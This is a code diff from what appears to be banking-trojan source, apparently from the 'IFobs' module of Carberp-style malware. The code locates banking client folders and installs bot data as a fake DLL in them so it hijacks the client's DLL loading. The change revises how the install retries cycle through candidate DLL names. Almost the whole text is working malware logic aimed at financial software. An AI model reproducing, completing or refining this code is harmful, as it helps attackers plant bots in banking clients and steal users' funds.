@@ -603,7 +603,7 @@ bool Init( const char* appName )
 
 static void FindExe(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
 {
-	DWORD hash = STR::GetHash(Search->cFileName,0,true);
+	DWORD hash = STR::GetHash(Search->cFileName, 0, true);
 	if( hash == PROCESS_HASH )
 	{
 		DBG( "IFobs", "Find %s", FileName );
@@ -731,11 +731,12 @@ DWORD WINAPI IntallFakeDll(void*)
 			for( int i = 0; i < clients.Count(); i++ )
 			{
 				m_lstrcpy( folderClient, clients[i].t_str() );
+				DWORD rand = (DWORD)pGetTickCount();
+				int n = rand % ARRAYSIZE(dlls);
 				for( int j = 0; j < 5; j++ ) //делаем 5 попыток установки, ошибка в инсталяции может быть из-за отсутствия нужной длл, на следующей попытке будет выбрана другая
 				{
 					pPathRemoveFileSpecA(folderClient);
-					DWORD rand = (DWORD)pGetTickCount();
-					pPathAppendA( folderClient, dlls[ rand % ARRAYSIZE(dlls) ] );
+					pPathAppendA( folderClient, dlls[n] );
 					m_memcpy( botData, bot.Data(), bot.Size() );
 					if( install( folderClient, botData, bot.Size()) )
 					{
@@ -744,7 +745,11 @@ DWORD WINAPI IntallFakeDll(void*)
 						break;
 					}
 					else
+					{
 						DBG("IFobs", "Инсталяция fake.dll для '%s' не выполнена", clients[i].t_str() );
+						n++;
+						if( n >= ARRAYSIZE(dlls) ) n = 0;
+					}
 				}
 			}
 			MemFree(botData);
